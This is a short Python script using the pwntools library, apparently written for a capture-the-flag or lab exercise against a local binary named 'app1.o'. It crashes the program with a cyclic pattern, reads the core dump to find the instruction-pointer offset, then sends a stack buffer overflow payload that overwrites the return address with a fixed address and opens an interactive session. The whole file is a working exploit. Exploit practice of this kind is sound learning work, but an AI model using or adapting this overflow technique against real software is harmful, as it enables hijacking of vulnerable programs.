#!/bin/python3

from pwn import *
import sys

if len(sys.argv)==1:
    app_path = "./app1.o"
else:
    app_path=sys.argv[1]

pty = process.PTY
elf = ELF(app_path)
io = process(elf.path, stdin=pty, stdout=pty)
io.clean()
io.sendline(cyclic(100, n=4))
io.wait()
core = io.corefile
info("eip = %#x", core.eip)

eip_offset = cyclic_find(pack(core.eip))

p = process(elf.path)
gdb.attach(p)
p.readuntil("Please enter your name: \n")
payload = b"a"*eip_offset
payload += p32(0x08049192)
p.sendline(payload)
p.interactive()
p.close()
